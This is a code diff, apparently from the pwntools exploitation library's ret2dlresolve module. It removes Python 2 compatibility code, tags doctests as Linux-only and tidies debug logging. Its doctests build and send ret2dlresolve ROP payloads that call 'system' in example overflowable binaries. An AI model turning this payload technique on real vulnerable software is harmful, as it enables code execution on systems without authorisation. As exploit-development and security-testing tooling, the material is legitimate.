@@ -32,9 +32,9 @@ We can automate the  process of exploitation with these some example binaries.
     0x0014:           0x2b84 [dlresolve index]
     0x0018:          b'gaaa' <return address>
     0x001c:        0x804ae24 arg0
-    >>> p = elf.process()
-    >>> p.sendline(fit({64+context.bytes*3: raw_rop, 200: dlresolve.payload}))
-    >>> p.recvline()
+    >>> p = elf.process() # doctest: +LINUX
+    >>> p.sendline(fit({64+context.bytes*3: raw_rop, 200: dlresolve.payload})) # doctest: +LINUX
+    >>> p.recvline() # doctest: +LINUX
     b'pwned\n'
 
 You can also use ``Ret2dlresolve`` on AMD64:
@@ -56,16 +56,15 @@ You can also use ``Ret2dlresolve`` on AMD64:
     0x0038:         0x601e48 [arg0] rdi = 6299208
     0x0040:         0x4003e0 [plt_init] system
     0x0048:          0x15670 [dlresolve index]
-    >>> p = elf.process()
-    >>> p.sendline(fit({64+context.bytes: raw_rop, 200: dlresolve.payload}))
-    >>> if dlresolve.unreliable:
+    >>> p = elf.process() # doctest: +LINUX
+    >>> p.sendline(fit({64+context.bytes: raw_rop, 200: dlresolve.payload})) # doctest: +LINUX
+    >>> if dlresolve.unreliable: # doctest: +LINUX
     ...     p.poll(True) == -signal.SIGSEGV
     ... else:
     ...     p.recvline() == b'pwned\n'
     True
 """
 
-import six
 from copy import deepcopy
 
 from pwnlib.context import context
@@ -79,7 +78,7 @@ log = getLogger(__name__)
 ELF32_R_SYM_SHIFT = 8
 ELF64_R_SYM_SHIFT = 32
 
-class Elf32_Rel(object):
+class Elf32_Rel:
     ''
     """
     .. code-block:: c
@@ -101,7 +100,7 @@ class Elf32_Rel(object):
         return self.__flat__()
 
 
-class Elf64_Rel(object):
+class Elf64_Rel:
     ''
     """
     .. code-block:: c
@@ -123,7 +122,7 @@ class Elf64_Rel(object):
         return self.__flat__()
 
 
-class Elf32_Sym(object):
+class Elf32_Sym:
     ''
     """
     .. code-block:: c
@@ -158,7 +157,7 @@ class Elf32_Sym(object):
         return self.__flat__()
 
 
-class Elf64_Sym(object):
+class Elf64_Sym:
     ''
     """
     .. code-block:: c
@@ -212,7 +211,7 @@ class MarkedBytes(bytes):
     pass
 
 
-class Ret2dlresolvePayload(object):
+class Ret2dlresolvePayload:
     """Create a ret2dlresolve payload
 
     Arguments:
@@ -330,16 +329,16 @@ class Ret2dlresolvePayload(object):
 
         ver_addr = self.versym + 2 * index # Elf_HalfWord
 
-        log.debug("Symtab: %s", hex(self.symtab))
-        log.debug("Strtab: %s", hex(self.strtab))
-        log.debug("Versym: %s", hex(self.versym))
-        log.debug("Jmprel: %s", hex(self.jmprel))
-        log.debug("ElfSym addr: %s", hex(sym_addr))
-        log.debug("ElfRel addr: %s", hex(rel_addr))
-        log.debug("Symbol name addr: %s", hex(symbol_name_addr))
-        log.debug("Version index addr: %s", hex(ver_addr))
-        log.debug("Data addr: %s", hex(self.data_addr))
-        log.debug("Resolution addr: %s", hex(self.resolution_addr))
+        log.debug("Symtab: %#x", self.symtab)
+        log.debug("Strtab: %#x", self.strtab)
+        log.debug("Versym: %#x", self.versym)
+        log.debug("Jmprel: %#x", self.jmprel)
+        log.debug("ElfSym addr: %#x", sym_addr)
+        log.debug("ElfRel addr: %#x", rel_addr)
+        log.debug("Symbol name addr: %#x", symbol_name_addr)
+        log.debug("Version index addr: %#x", ver_addr)
+        log.debug("Data addr: %#x", self.data_addr)
+        log.debug("Resolution addr: %#x", self.resolution_addr)
         if not self.elf.memory[ver_addr]:
             log.warn("Ret2dlresolve is likely impossible in this ELF "
                      "(too big gap between text and writable sections).\n"
@@ -377,7 +376,7 @@ class Ret2dlresolvePayload(object):
             elif isinstance(top, bytes):
                 top = pack(self.data_addr + len(self.payload) + queue.size())
                 queue.append(MarkedBytes(queue[0]))
-            elif isinstance(top, six.integer_types):
+            elif isinstance(top, int):
                 top = pack(top)
 
             self.payload += top
